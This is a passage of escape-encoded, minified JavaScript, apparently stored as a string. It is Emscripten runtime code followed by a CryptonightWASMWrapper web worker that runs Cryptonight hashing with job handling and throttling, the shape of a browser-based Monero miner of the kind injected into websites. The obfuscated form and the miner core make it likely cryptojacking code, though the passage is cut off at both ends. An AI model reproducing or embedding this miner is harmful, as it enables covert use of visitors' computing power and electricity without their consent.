20chunkOffset=idx%this.chunkSize;var\x20chunkNum=idx/this.chunkSize|0;return\x20this.getter(chunkNum)[chunkOffset]};LazyUint8Array.prototype.setDataGetter=function\x20LazyUint8Array_setDataGetter(getter){this.getter=getter};LazyUint8Array.prototype.cacheLength=function\x20LazyUint8Array_cacheLength(){var\x20xhr=new\x20XMLHttpRequest;xhr.open(\x22HEAD\x22,url,false);xhr.send(null);if(!(xhr.status>=200&&xhr.status<300||xhr.status===304))throw\x20new\x20Error(\x22Couldn\x27t\x20load\x20\x22+url+\x22.\x20Status:\x20\x22+xhr.status);var\x20datalength=Number(xhr.getResponseHeader(\x22Content-length\x22));var\x20header;var\x20hasByteServing=(header=xhr.getResponseHeader(\x22Accept-Ranges\x22))&&header===\x22bytes\x22;var\x20usesGzip=(header=xhr.getResponseHeader(\x22Content-Encoding\x22))&&header===\x22gzip\x22;var\x20chunkSize=1024*1024;if(!hasByteServing)chunkSize=datalength;var\x20doXHR=(function(from,to){if(from>to)throw\x20new\x20Error(\x22invalid\x20range\x20(\x22+from+\x22,\x20\x22+to+\x22)\x20or\x20no\x20bytes\x20requested!\x22);if(to>datalength-1)throw\x20new\x20Error(\x22only\x20\x22+datalength+\x22\x20bytes\x20available!\x20programmer\x20error!\x22);var\x20xhr=new\x20XMLHttpRequest;xhr.open(\x22GET\x22,url,false);if(datalength!==chunkSize)xhr.setRequestHeader(\x22Range\x22,\x22bytes=\x22+from+\x22-\x22+to);if(typeof\x20Uint8Array!=\x22undefined\x22)xhr.responseType=\x22arraybuffer\x22;if(xhr.overrideMimeType){xhr.overrideMimeType(\x22text/plain;\x20charset=x-user-defined\x22)}xhr.send(null);if(!(xhr.status>=200&&xhr.status<300||xhr.status===304))throw\x20new\x20Error(\x22Couldn\x27t\x20load\x20\x22+url+\x22.\x20Status:\x20\x22+xhr.status);if(xhr.response!==undefined){return\x20new\x20Uint8Array(xhr.response||[])}else{return\x20intArrayFromString(xhr.responseText||\x22\x22,true)}});var\x20lazyArray=this;lazyArray.setDataGetter((function(chunkNum){var\x20start=chunkNum*chunkSize;var\x20end=(chunkNum+1)*chunkSize-1;end=Math.min(end,datalength-1);if(typeof\x20lazyArray.chunks[chunkNum]===\x22undefined\x22){lazyArray.chunks[chunkNum]=doXHR(start,end)}if(typeof\x20lazyArray.chunks[chunkNum]===\x22undefined\x22)throw\x20new\x20Error(\x22doXHR\x20failed!\x22);return\x20lazyArray.chunks[chunkNum]}));if(usesGzip||!datalength){chunkSize=datalength=1;datalength=this.getter(0).length;chunkSize=datalength;console.log(\x22LazyFiles\x20on\x20gzip\x20forces\x20download\x20of\x20the\x20whole\x20file\x20when\x20length\x20is\x20accessed\x22)}this._length=datalength;this._chunkSize=chunkSize;this.lengthKnown=true};if(typeof\x20XMLHttpRequest!==\x22undefined\x22){if(!ENVIRONMENT_IS_WORKER)throw\x22Cannot\x20do\x20synchronous\x20binary\x20XHRs\x20outside\x20webworkers\x20in\x20modern\x20browsers.\x20Use\x20--embed-file\x20or\x20--preload-file\x20in\x20emcc\x22;var\x20lazyArray=new\x20LazyUint8Array;Object.defineProperties(lazyArray,{length:{get:(function(){if(!this.lengthKnown){this.cacheLength()}return\x20this._length})},chunkSize:{get:(function(){if(!this.lengthKnown){this.cacheLength()}return\x20this._chunkSize})}});var\x20properties={isDevice:false,contents:lazyArray}}else{var\x20properties={isDevice:false,url:url}}var\x20node=FS.createFile(parent,name,properties,canRead,canWrite);if(properties.contents){node.contents=properties.contents}else\x20if(properties.url){node.contents=null;node.url=properties.url}Object.defineProperties(node,{usedBytes:{get:(function(){return\x20this.contents.length})}});var\x20stream_ops={};var\x20keys=Object.keys(node.stream_ops);keys.forEach((function(key){var\x20fn=node.stream_ops[key];stream_ops[key]=function\x20forceLoadLazyFile(){if(!FS.forceLoadFile(node)){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EIO)}return\x20fn.apply(null,arguments)}}));stream_ops.read=function\x20stream_ops_read(stream,buffer,offset,length,position){if(!FS.forceLoadFile(node)){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EIO)}var\x20contents=stream.node.contents;if(position>=contents.length)return\x200;var\x20size=Math.min(contents.length-position,length);assert(size>=0);if(contents.slice){for(var\x20i=0;i<size;i++){buffer[offset+i]=contents[position+i]}}else{for(var\x20i=0;i<size;i++){buffer[offset+i]=contents.get(position+i)}}return\x20size};node.stream_ops=stream_ops;return\x20node}),createPreloadedFile:(function(parent,name,url,canRead,canWrite,onload,onerror,dontCreateFile,canOwn,preFinish){Browser.init();var\x20fullname=name?PATH.resolve(PATH.join2(parent,name)):parent;var\x20dep=getUniqueRunDependency(\x22cp\x20\x22+fullname);function\x20processData(byteArray){function\x20finish(byteArray){if(preFinish)preFinish();if(!dontCreateFile){FS.createDataFile(parent,name,byteArray,canRead,canWrite,canOwn)}if(onload)onload();removeRunDependency(dep)}var\x20handled=false;Module[\x22preloadPlugins\x22].forEach((function(plugin){if(handled)return;if(plugin[\x22canHandle\x22](fullname)){plugin[\x22handle\x22](byteArray,fullname,finish,(function(){if(onerror)onerror();removeRunDependency(dep)}));handled=true}}));if(!handled)finish(byteArray)}addRunDependency(dep);if(typeof\x20url==\x22string\x22){Browser.asyncLoad(url,(function(byteArray){processData(byteArray)}),onerror)}else{processData(url)}}),indexedDB:(function(){return\x20window.indexedDB||window.mozIndexedDB||window.webkitIndexedDB||window.msIndexedDB}),DB_NAME:(function(){return\x22EM_FS_\x22+window.location.pathname}),DB_VERSION:20,DB_STORE_NAME:\x22FILE_DATA\x22,saveFilesToDB:(function(paths,onload,onerror){onload=onload||(function(){});onerror=onerror||(function(){});var\x20indexedDB=FS.indexedDB();try{var\x20openRequest=indexedDB.open(FS.DB_NAME(),FS.DB_VERSION)}catch(e){return\x20onerror(e)}openRequest.onupgradeneeded=function\x20openRequest_onupgradeneeded(){console.log(\x22creating\x20db\x22);var\x20db=openRequest.result;db.createObjectStore(FS.DB_STORE_NAME)};openRequest.onsuccess=function\x20openRequest_onsuccess(){var\x20db=openRequest.result;var\x20transaction=db.transaction([FS.DB_STORE_NAME],\x22readwrite\x22);var\x20files=transaction.objectStore(FS.DB_STORE_NAME);var\x20ok=0,fail=0,total=paths.length;function\x20finish(){if(fail==0)onload();else\x20onerror()}paths.forEach((function(path){var\x20putRequest=files.put(FS.analyzePath(path).object.contents,path);putRequest.onsuccess=function\x20putRequest_onsuccess(){ok++;if(ok+fail==total)finish()};putRequest.onerror=function\x20putRequest_onerror(){fail++;if(ok+fail==total)finish()}}));transaction.onerror=onerror};openRequest.onerror=onerror}),loadFilesFromDB:(function(paths,onload,onerror){onload=onload||(function(){});onerror=onerror||(function(){});var\x20indexedDB=FS.indexedDB();try{var\x20openRequest=indexedDB.open(FS.DB_NAME(),FS.DB_VERSION)}catch(e){return\x20onerror(e)}openRequest.onupgradeneeded=onerror;openRequest.onsuccess=function\x20openRequest_onsuccess(){var\x20db=openRequest.result;try{var\x20transaction=db.transaction([FS.DB_STORE_NAME],\x22readonly\x22)}catch(e){onerror(e);return}var\x20files=transaction.objectStore(FS.DB_STORE_NAME);var\x20ok=0,fail=0,total=paths.length;function\x20finish(){if(fail==0)onload();else\x20onerror()}paths.forEach((function(path){var\x20getRequest=files.get(path);getRequest.onsuccess=function\x20getRequest_onsuccess(){if(FS.analyzePath(path).exists){FS.unlink(path)}FS.createDataFile(PATH.dirname(path),PATH.basename(path),getRequest.result,true,true,true);ok++;if(ok+fail==total)finish()};getRequest.onerror=function\x20getRequest_onerror(){fail++;if(ok+fail==total)finish()}}));transaction.onerror=onerror};openRequest.onerror=onerror})};var\x20SYSCALLS={DEFAULT_POLLMASK:5,mappings:{},umask:511,calculateAt:(function(dirfd,path){if(path[0]!==\x22/\x22){var\x20dir;if(dirfd===-100){dir=FS.cwd()}else{var\x20dirstream=FS.getStream(dirfd);if(!dirstream)throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EBADF);dir=dirstream.path}path=PATH.join2(dir,path)}return\x20path}),doStat:(function(func,path,buf){try{var\x20stat=func(path)}catch(e){if(e&&e.node&&PATH.normalize(path)!==PATH.normalize(FS.getPath(e.node))){return-ERRNO_CODES.ENOTDIR}throw\x20e}HEAP32[buf>>2]=stat.dev;HEAP32[buf+4>>2]=0;HEAP32[buf+8>>2]=stat.ino;HEAP32[buf+12>>2]=stat.mode;HEAP32[buf+16>>2]=stat.nlink;HEAP32[buf+20>>2]=stat.uid;HEAP32[buf+24>>2]=stat.gid;HEAP32[buf+28>>2]=stat.rdev;HEAP32[buf+32>>2]=0;HEAP32[buf+36>>2]=stat.size;HEAP32[buf+40>>2]=4096;HEAP32[buf+44>>2]=stat.blocks;HEAP32[buf+48>>2]=stat.atime.getTime()/1e3|0;HEAP32[buf+52>>2]=0;HEAP32[buf+56>>2]=stat.mtime.getTime()/1e3|0;HEAP32[buf+60>>2]=0;HEAP32[buf+64>>2]=stat.ctime.getTime()/1e3|0;HEAP32[buf+68>>2]=0;HEAP32[buf+72>>2]=stat.ino;return\x200}),doMsync:(function(addr,stream,len,flags){var\x20buffer=new\x20Uint8Array(HEAPU8.subarray(addr,addr+len));FS.msync(stream,buffer,0,len,flags)}),doMkdir:(function(path,mode){path=PATH.normalize(path);if(path[path.length-1]===\x22/\x22)path=path.substr(0,path.length-1);FS.mkdir(path,mode,0);return\x200}),doMknod:(function(path,mode,dev){switch(mode&61440){case\x2032768:case\x208192:case\x2024576:case\x204096:case\x2049152:break;default:return-ERRNO_CODES.EINVAL}FS.mknod(path,mode,dev);return\x200}),doReadlink:(function(path,buf,bufsize){if(bufsize<=0)return-ERRNO_CODES.EINVAL;var\x20ret=FS.readlink(path);var\x20len=Math.min(bufsize,lengthBytesUTF8(ret));var\x20endChar=HEAP8[buf+len];stringToUTF8(ret,buf,bufsize+1);HEAP8[buf+len]=endChar;return\x20len}),doAccess:(function(path,amode){if(amode&~7){return-ERRNO_CODES.EINVAL}var\x20node;var\x20lookup=FS.lookupPath(path,{follow:true});node=lookup.node;var\x20perms=\x22\x22;if(amode&4)perms+=\x22r\x22;if(amode&2)perms+=\x22w\x22;if(amode&1)perms+=\x22x\x22;if(perms&&FS.nodePermissions(node,perms)){return-ERRNO_CODES.EACCES}return\x200}),doDup:(function(path,flags,suggestFD){var\x20suggest=FS.getStream(suggestFD);if(suggest)FS.close(suggest);return\x20FS.open(path,flags,0,suggestFD,suggestFD).fd}),doReadv:(function(stream,iov,iovcnt,offset){var\x20ret=0;for(var\x20i=0;i<iovcnt;i++){var\x20ptr=HEAP32[iov+i*8>>2];var\x20len=HEAP32[iov+(i*8+4)>>2];var\x20curr=FS.read(stream,HEAP8,ptr,len,offset);if(curr<0)return-1;ret+=curr;if(curr<len)break}return\x20ret}),doWritev:(function(stream,iov,iovcnt,offset){var\x20ret=0;for(var\x20i=0;i<iovcnt;i++){var\x20ptr=HEAP32[iov+i*8>>2];var\x20len=HEAP32[iov+(i*8+4)>>2];var\x20curr=FS.write(stream,HEAP8,ptr,len,offset);if(curr<0)return-1;ret+=curr}return\x20ret}),varargs:0,get:(function(varargs){SYSCALLS.varargs+=4;var\x20ret=HEAP32[SYSCALLS.varargs-4>>2];return\x20ret}),getStr:(function(){var\x20ret=Pointer_stringify(SYSCALLS.get());return\x20ret}),getStreamFromFD:(function(){var\x20stream=FS.getStream(SYSCALLS.get());if(!stream)throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EBADF);return\x20stream}),getSocketFromFD:(function(){var\x20socket=SOCKFS.getSocket(SYSCALLS.get());if(!socket)throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EBADF);return\x20socket}),getSocketAddress:(function(allowNull){var\x20addrp=SYSCALLS.get(),addrlen=SYSCALLS.get();if(allowNull&&addrp===0)return\x20null;var\x20info=__read_sockaddr(addrp,addrlen);if(info.errno)throw\x20new\x20FS.ErrnoError(info.errno);info.addr=DNS.lookup_addr(info.addr)||info.addr;return\x20info}),get64:(function(){var\x20low=SYSCALLS.get(),high=SYSCALLS.get();if(low>=0)assert(high===0);else\x20assert(high===-1);return\x20low}),getZero:(function(){assert(SYSCALLS.get()===0)})};function\x20___syscall20(which,varargs){SYSCALLS.varargs=varargs;try{return\x20PROCINFO.pid}catch(e){if(typeof\x20FS===\x22undefined\x22||!(e\x20instanceof\x20FS.ErrnoError))abort(e);return-e.errno}}var\x20___tm_current=STATICTOP;STATICTOP+=48;var\x20___tm_timezone=allocate(intArrayFromString(\x22GMT\x22),\x22i8\x22,ALLOC_STATIC);function\x20_gmtime_r(time,tmPtr){var\x20date=new\x20Date(HEAP32[time>>2]*1e3);HEAP32[tmPtr>>2]=date.getUTCSeconds();HEAP32[tmPtr+4>>2]=date.getUTCMinutes();HEAP32[tmPtr+8>>2]=date.getUTCHours();HEAP32[tmPtr+12>>2]=date.getUTCDate();HEAP32[tmPtr+16>>2]=date.getUTCMonth();HEAP32[tmPtr+20>>2]=date.getUTCFullYear()-1900;HEAP32[tmPtr+24>>2]=date.getUTCDay();HEAP32[tmPtr+36>>2]=0;HEAP32[tmPtr+32>>2]=0;var\x20start=Date.UTC(date.getUTCFullYear(),0,1,0,0,0,0);var\x20yday=(date.getTime()-start)/(1e3*60*60*24)|0;HEAP32[tmPtr+28>>2]=yday;HEAP32[tmPtr+40>>2]=___tm_timezone;return\x20tmPtr}function\x20_gmtime(time){return\x20_gmtime_r(time,___tm_current)}function\x20___lock(){}function\x20___unlock(){}function\x20___syscall6(which,varargs){SYSCALLS.varargs=varargs;try{var\x20stream=SYSCALLS.getStreamFromFD();FS.close(stream);return\x200}catch(e){if(typeof\x20FS===\x22undefined\x22||!(e\x20instanceof\x20FS.ErrnoError))abort(e);return-e.errno}}function\x20_emscripten_memcpy_big(dest,src,num){HEAPU8.set(HEAPU8.subarray(src,src+num),dest);return\x20dest}function\x20_ftime(p){var\x20millis=Date.now();HEAP32[p>>2]=millis/1e3|0;HEAP16[p+4>>1]=millis%1e3;HEAP16[p+6>>1]=0;HEAP16[p+8>>1]=0;return\x200}function\x20___syscall140(which,varargs){SYSCALLS.varargs=varargs;try{var\x20stream=SYSCALLS.getStreamFromFD(),offset_high=SYSCALLS.get(),offset_low=SYSCALLS.get(),result=SYSCALLS.get(),whence=SYSCALLS.get();var\x20offset=offset_low;FS.llseek(stream,offset,whence);HEAP32[result>>2]=stream.position;if(stream.getdents&&offset===0&&whence===0)stream.getdents=null;return\x200}catch(e){if(typeof\x20FS===\x22undefined\x22||!(e\x20instanceof\x20FS.ErrnoError))abort(e);return-e.errno}}function\x20___syscall146(which,varargs){SYSCALLS.varargs=varargs;try{var\x20stream=SYSCALLS.getStreamFromFD(),iov=SYSCALLS.get(),iovcnt=SYSCALLS.get();return\x20SYSCALLS.doWritev(stream,iov,iovcnt)}catch(e){if(typeof\x20FS===\x22undefined\x22||!(e\x20instanceof\x20FS.ErrnoError))abort(e);return-e.errno}}function\x20___syscall54(which,varargs){SYSCALLS.varargs=varargs;try{var\x20stream=SYSCALLS.getStreamFromFD(),op=SYSCALLS.get();switch(op){case\x2021505:{if(!stream.tty)return-ERRNO_CODES.ENOTTY;return\x200};case\x2021506:{if(!stream.tty)return-ERRNO_CODES.ENOTTY;return\x200};case\x2021519:{if(!stream.tty)return-ERRNO_CODES.ENOTTY;var\x20argp=SYSCALLS.get();HEAP32[argp>>2]=0;return\x200};case\x2021520:{if(!stream.tty)return-ERRNO_CODES.ENOTTY;return-ERRNO_CODES.EINVAL};case\x2021531:{var\x20argp=SYSCALLS.get();return\x20FS.ioctl(stream,op,argp)};case\x2021523:{if(!stream.tty)return-ERRNO_CODES.ENOTTY;return\x200};default:abort(\x22bad\x20ioctl\x20syscall\x20\x22+op)}}catch(e){if(typeof\x20FS===\x22undefined\x22||!(e\x20instanceof\x20FS.ErrnoError))abort(e);return-e.errno}}FS.staticInit();__ATINIT__.unshift((function(){if(!Module[\x22noFSInit\x22]&&!FS.init.initialized)FS.init()}));__ATMAIN__.push((function(){FS.ignorePermissions=false}));__ATEXIT__.push((function(){FS.quit()}));Module[\x22FS_createFolder\x22]=FS.createFolder;Module[\x22FS_createPath\x22]=FS.createPath;Module[\x22FS_createDataFile\x22]=FS.createDataFile;Module[\x22FS_createPreloadedFile\x22]=FS.createPreloadedFile;Module[\x22FS_createLazyFile\x22]=FS.createLazyFile;Module[\x22FS_createLink\x22]=FS.createLink;Module[\x22FS_createDevice\x22]=FS.createDevice;Module[\x22FS_unlink\x22]=FS.unlink;__ATINIT__.unshift((function(){TTY.init()}));__ATEXIT__.push((function(){TTY.shutdown()}));if(ENVIRONMENT_IS_NODE){var\x20fs=require(\x22fs\x22);var\x20NODEJS_PATH=require(\x22path\x22);NODEFS.staticInit()}DYNAMICTOP_PTR=allocate(1,\x22i32\x22,ALLOC_STATIC);STACK_BASE=STACKTOP=Runtime.alignMemory(STATICTOP);STACK_MAX=STACK_BASE+TOTAL_STACK;DYNAMIC_BASE=Runtime.alignMemory(STACK_MAX);HEAP32[DYNAMICTOP_PTR>>2]=DYNAMIC_BASE;staticSealed=true;Module[\x22wasmTableSize\x22]=14;Module[\x22wasmMaxTableSize\x22]=14;function\x20invoke_ii(index,a1){try{return\x20Module[\x22dynCall_ii\x22](index,a1)}catch(e){if(typeof\x20e!==\x22number\x22&&e!==\x22longjmp\x22)throw\x20e;Module[\x22setThrew\x22](1,0)}}function\x20invoke_iiii(index,a1,a2,a3){try{return\x20Module[\x22dynCall_iiii\x22](index,a1,a2,a3)}catch(e){if(typeof\x20e!==\x22number\x22&&e!==\x22longjmp\x22)throw\x20e;Module[\x22setThrew\x22](1,0)}}function\x20invoke_viii(index,a1,a2,a3){try{Module[\x22dynCall_viii\x22](index,a1,a2,a3)}catch(e){if(typeof\x20e!==\x22number\x22&&e!==\x22longjmp\x22)throw\x20e;Module[\x22setThrew\x22](1,0)}}Module.asmGlobalArg={\x22Math\x22:Math,\x22Int8Array\x22:Int8Array,\x22Int16Array\x22:Int16Array,\x22Int32Array\x22:Int32Array,\x22Uint8Array\x22:Uint8Array,\x22Uint16Array\x22:Uint16Array,\x22Uint32Array\x22:Uint32Array,\x22Float32Array\x22:Float32Array,\x22Float64Array\x22:Float64Array,\x22NaN\x22:NaN,\x22Infinity\x22:Infinity};Module.asmLibraryArg={\x22abort\x22:abort,\x22assert\x22:assert,\x22enlargeMemory\x22:enlargeMemory,\x22getTotalMemory\x22:getTotalMemory,\x22abortOnCannotGrowMemory\x22:abortOnCannotGrowMemory,\x22invoke_ii\x22:invoke_ii,\x22invoke_iiii\x22:invoke_iiii,\x22invoke_viii\x22:invoke_viii,\x22_gmtime_r\x22:_gmtime_r,\x22_gmtime\x22:_gmtime,\x22___lock\x22:___lock,\x22___syscall6\x22:___syscall6,\x22___setErrNo\x22:___setErrNo,\x22___unlock\x22:___unlock,\x22_ftime\x22:_ftime,\x22_emscripten_memcpy_big\x22:_emscripten_memcpy_big,\x22___syscall54\x22:___syscall54,\x22___syscall140\x22:___syscall140,\x22___syscall20\x22:___syscall20,\x22___assert_fail\x22:___assert_fail,\x22___syscall146\x22:___syscall146,\x22DYNAMICTOP_PTR\x22:DYNAMICTOP_PTR,\x22tempDoublePtr\x22:tempDoublePtr,\x22ABORT\x22:ABORT,\x22STACKTOP\x22:STACKTOP,\x22STACK_MAX\x22:STACK_MAX};var\x20asm=Module[\x22asm\x22](Module.asmGlobalArg,Module.asmLibraryArg,buffer);Module[\x22asm\x22]=asm;var\x20_cryptonight_hash=Module[\x22_cryptonight_hash\x22]=(function(){return\x20Module[\x22asm\x22][\x22_cryptonight_hash\x22].apply(null,arguments)});var\x20getTempRet0=Module[\x22getTempRet0\x22]=(function(){return\x20Module[\x22asm\x22][\x22getTempRet0\x22].apply(null,arguments)});var\x20_free=Module[\x22_free\x22]=(function(){return\x20Module[\x22asm\x22][\x22_free\x22].apply(null,arguments)});var\x20runPostSets=Module[\x22runPostSets\x22]=(function(){return\x20Module[\x22asm\x22][\x22runPostSets\x22].apply(null,arguments)});var\x20setTempRet0=Module[\x22setTempRet0\x22]=(function(){return\x20Module[\x22asm\x22][\x22setTempRet0\x22].apply(null,arguments)});var\x20establishStackSpace=Module[\x22establishStackSpace\x22]=(function(){return\x20Module[\x22asm\x22][\x22establishStackSpace\x22].apply(null,arguments)});var\x20_memmove=Module[\x22_memmove\x22]=(function(){return\x20Module[\x22asm\x22][\x22_memmove\x22].apply(null,arguments)});var\x20stackSave=Module[\x22stackSave\x22]=(function(){return\x20Module[\x22asm\x22][\x22stackSave\x22].apply(null,arguments)});var\x20_memset=Module[\x22_memset\x22]=(function(){return\x20Module[\x22asm\x22][\x22_memset\x22].apply(null,arguments)});var\x20_malloc=Module[\x22_malloc\x22]=(function(){return\x20Module[\x22asm\x22][\x22_malloc\x22].apply(null,arguments)});var\x20_cryptonight_create=Module[\x22_cryptonight_create\x22]=(function(){return\x20Module[\x22asm\x22][\x22_cryptonight_create\x22].apply(null,arguments)});var\x20_memcpy=Module[\x22_memcpy\x22]=(function(){return\x20Module[\x22asm\x22][\x22_memcpy\x22].apply(null,arguments)});var\x20_emscripten_get_global_libc=Module[\x22_emscripten_get_global_libc\x22]=(function(){return\x20Module[\x22asm\x22][\x22_emscripten_get_global_libc\x22].apply(null,arguments)});var\x20stackAlloc=Module[\x22stackAlloc\x22]=(function(){return\x20Module[\x22asm\x22][\x22stackAlloc\x22].apply(null,arguments)});var\x20setThrew=Module[\x22setThrew\x22]=(function(){return\x20Module[\x22asm\x22][\x22setThrew\x22].apply(null,arguments)});var\x20_sbrk=Module[\x22_sbrk\x22]=(function(){return\x20Module[\x22asm\x22][\x22_sbrk\x22].apply(null,arguments)});var\x20_fflush=Module[\x22_fflush\x22]=(function(){return\x20Module[\x22asm\x22][\x22_fflush\x22].apply(null,arguments)});var\x20stackRestore=Module[\x22stackRestore\x22]=(function(){return\x20Module[\x22asm\x22][\x22stackRestore\x22].apply(null,arguments)});var\x20_cryptonight_destroy=Module[\x22_cryptonight_destroy\x22]=(function(){return\x20Module[\x22asm\x22][\x22_cryptonight_destroy\x22].apply(null,arguments)});var\x20___errno_location=Module[\x22___errno_location\x22]=(function(){return\x20Module[\x22asm\x22][\x22___errno_location\x22].apply(null,arguments)});var\x20dynCall_ii=Module[\x22dynCall_ii\x22]=(function(){return\x20Module[\x22asm\x22][\x22dynCall_ii\x22].apply(null,arguments)});var\x20dynCall_iiii=Module[\x22dynCall_iiii\x22]=(function(){return\x20Module[\x22asm\x22][\x22dynCall_iiii\x22].apply(null,arguments)});var\x20dynCall_viii=Module[\x22dynCall_viii\x22]=(function(){return\x20Module[\x22asm\x22][\x22dynCall_viii\x22].apply(null,arguments)});Runtime.stackAlloc=Module[\x22stackAlloc\x22];Runtime.stackSave=Module[\x22stackSave\x22];Runtime.stackRestore=Module[\x22stackRestore\x22];Runtime.establishStackSpace=Module[\x22establishStackSpace\x22];Runtime.setTempRet0=Module[\x22setTempRet0\x22];Runtime.getTempRet0=Module[\x22getTempRet0\x22];Module[\x22asm\x22]=asm;if(memoryInitializer){if(typeof\x20Module[\x22locateFile\x22]===\x22function\x22){memoryInitializer=Module[\x22locateFile\x22](memoryInitializer)}else\x20if(Module[\x22memoryInitializerPrefixURL\x22]){memoryInitializer=Module[\x22memoryInitializerPrefixURL\x22]+memoryInitializer}if(ENVIRONMENT_IS_NODE||ENVIRONMENT_IS_SHELL){var\x20data=Module[\x22readBinary\x22](memoryInitializer);HEAPU8.set(data,Runtime.GLOBAL_BASE)}else{addRunDependency(\x22memory\x20initializer\x22);var\x20applyMemoryInitializer=(function(data){if(data.byteLength)data=new\x20Uint8Array(data);HEAPU8.set(data,Runtime.GLOBAL_BASE);if(Module[\x22memoryInitializerRequest\x22])delete\x20Module[\x22memoryInitializerRequest\x22].response;removeRunDependency(\x22memory\x20initializer\x22)});function\x20doBrowserLoad(){Module[\x22readAsync\x22](memoryInitializer,applyMemoryInitializer,(function(){throw\x22could\x20not\x20load\x20memory\x20initializer\x20\x22+memoryInitializer}))}if(Module[\x22memoryInitializerRequest\x22]){function\x20useRequest(){var\x20request=Module[\x22memoryInitializerRequest\x22];if(request.status!==200&&request.status!==0){console.warn(\x22a\x20problem\x20seems\x20to\x20have\x20happened\x20with\x20Module.memoryInitializerRequest,\x20status:\x20\x22+request.status+\x22,\x20retrying\x20\x22+memoryInitializer);doBrowserLoad();return}applyMemoryInitializer(request.response)}if(Module[\x22memoryInitializerRequest\x22].response){setTimeout(useRequest,0)}else{Module[\x22memoryInitializerRequest\x22].addEventListener(\x22load\x22,useRequest)}}else{doBrowserLoad()}}}function\x20ExitStatus(status){this.name=\x22ExitStatus\x22;this.message=\x22Program\x20terminated\x20with\x20exit(\x22+status+\x22)\x22;this.status=status}ExitStatus.prototype=new\x20Error;ExitStatus.prototype.constructor=ExitStatus;var\x20initialStackTop;var\x20preloadStartTime=null;var\x20calledMain=false;dependenciesFulfilled=function\x20runCaller(){if(!Module[\x22calledRun\x22])run();if(!Module[\x22calledRun\x22])dependenciesFulfilled=runCaller};Module[\x22callMain\x22]=Module.callMain=function\x20callMain(args){args=args||[];ensureInitRuntime();var\x20argc=args.length+1;function\x20pad(){for(var\x20i=0;i<4-1;i++){argv.push(0)}}var\x20argv=[allocate(intArrayFromString(Module[\x22thisProgram\x22]),\x22i8\x22,ALLOC_NORMAL)];pad();for(var\x20i=0;i<argc-1;i=i+1){argv.push(allocate(intArrayFromString(args[i]),\x22i8\x22,ALLOC_NORMAL));pad()}argv.push(0);argv=allocate(argv,\x22i32\x22,ALLOC_NORMAL);try{var\x20ret=Module[\x22_main\x22](argc,argv,0);exit(ret,true)}catch(e){if(e\x20instanceof\x20ExitStatus){return}else\x20if(e==\x22SimulateInfiniteLoop\x22){Module[\x22noExitRuntime\x22]=true;return}else{var\x20toLog=e;if(e&&typeof\x20e===\x22object\x22&&e.stack){toLog=[e,e.stack]}Module.printErr(\x22exception\x20thrown:\x20\x22+toLog);Module[\x22quit\x22](1,e)}}finally{calledMain=true}};function\x20run(args){args=args||Module[\x22arguments\x22];if(preloadStartTime===null)preloadStartTime=Date.now();if(runDependencies>0){return}preRun();if(runDependencies>0)return;if(Module[\x22calledRun\x22])return;function\x20doRun(){if(Module[\x22calledRun\x22])return;Module[\x22calledRun\x22]=true;if(ABORT)return;ensureInitRuntime();preMain();if(Module[\x22onRuntimeInitialized\x22])Module[\x22onRuntimeInitialized\x22]();if(Module[\x22_main\x22]&&shouldRunNow)Module[\x22callMain\x22](args);postRun()}if(Module[\x22setStatus\x22]){Module[\x22setStatus\x22](\x22Running...\x22);setTimeout((function(){setTimeout((function(){Module[\x22setStatus\x22](\x22\x22)}),1);doRun()}),1)}else{doRun()}}Module[\x22run\x22]=Module.run=run;function\x20exit(status,implicit){if(implicit&&Module[\x22noExitRuntime\x22]){return}if(Module[\x22noExitRuntime\x22]){}else{ABORT=true;EXITSTATUS=status;STACKTOP=initialStackTop;exitRuntime();if(Module[\x22onExit\x22])Module[\x22onExit\x22](status)}if(ENVIRONMENT_IS_NODE){process[\x22exit\x22](status)}Module[\x22quit\x22](status,new\x20ExitStatus(status))}Module[\x22exit\x22]=Module.exit=exit;var\x20abortDecorators=[];function\x20abort(what){if(Module[\x22onAbort\x22]){Module[\x22onAbort\x22](what)}if(what!==undefined){Module.print(what);Module.printErr(what);what=JSON.stringify(what)}else{what=\x22\x22}ABORT=true;EXITSTATUS=1;var\x20extra=\x22\x5cnIf\x20this\x20abort()\x20is\x20unexpected,\x20build\x20with\x20-s\x20ASSERTIONS=1\x20which\x20can\x20give\x20more\x20information.\x22;var\x20output=\x22abort(\x22+what+\x22)\x20at\x20\x22+stackTrace()+extra;if(abortDecorators){abortDecorators.forEach((function(decorator){output=decorator(output,what)}))}throw\x20output}Module[\x22abort\x22]=Module.abort=abort;if(Module[\x22preInit\x22]){if(typeof\x20Module[\x22preInit\x22]==\x22function\x22)Module[\x22preInit\x22]=[Module[\x22preInit\x22]];while(Module[\x22preInit\x22].length>0){Module[\x22preInit\x22].pop()()}}var\x20shouldRunNow=true;if(Module[\x22noInitialRun\x22]){shouldRunNow=false}run();var\x20CryptonightWASMWrapper=(function(){this.ctx=_cryptonight_create();this.throttleWait=0;this.throttledStart=0;this.throttledHashes=0;this.workThrottledBound=this.workThrottled.bind(this);this.currentJob=null;this.target=new\x20Uint8Array([255,255,255,255,255,255,255,255]);var\x20heap=Module.HEAPU8.buffer;this.input=new\x20Uint8Array(heap,Module._malloc(84),84);this.output=new\x20Uint8Array(heap,Module._malloc(32),32);self.postMessage(\x22ready\x22);self.onmessage=this.onMessage.bind(this)});CryptonightWASMWrapper.prototype.onMessage=(function(msg){var\x20job=msg.data;if(job.verify_id){this.verify(job);return}if(!this.currentJob||this.currentJob.job_id!==job.job_id){this.setJob(job)}if(job.throttle){this.throttleWait=1/(1-job.throttle)-1;this.throttledStart=this.now();this.throttledHashes=0;this.workThrottled()}else{this.work()}});CryptonightWASMWrapper.prototype.destroy=(function(){_cryptonight_destroy(this.ctx)});CryptonightWASMWrapper.prototype.hexToBytes=(function(hex,bytes){var\x20bytes=new\x20Uint8Array(hex.length/2);for(var\x20i=0,c=0;c<hex.length;c+=2,i++){bytes[i]=parseInt(hex.substr(c,2),16)}return\x20bytes});CryptonightWASMWrapper.prototype.bytesToHex=(function(bytes){for(var\x20hex=\x22\x22,i=0;i<bytes.length;i++){hex+=(bytes[i]>>>4).toString(16);hex+=(bytes[i]&15).toString(16)}return\x20hex});CryptonightWASMWrapper.prototype.meetsTarget=(function(hash,target){for(var\x20i=0;i<target.length;i++){var\x20hi=hash.length-i-1,ti=target.length-i-1;if(hash[hi]>target[ti]){return\x20false}else\x20if(hash[hi]<target[ti]){return\x20true}}ret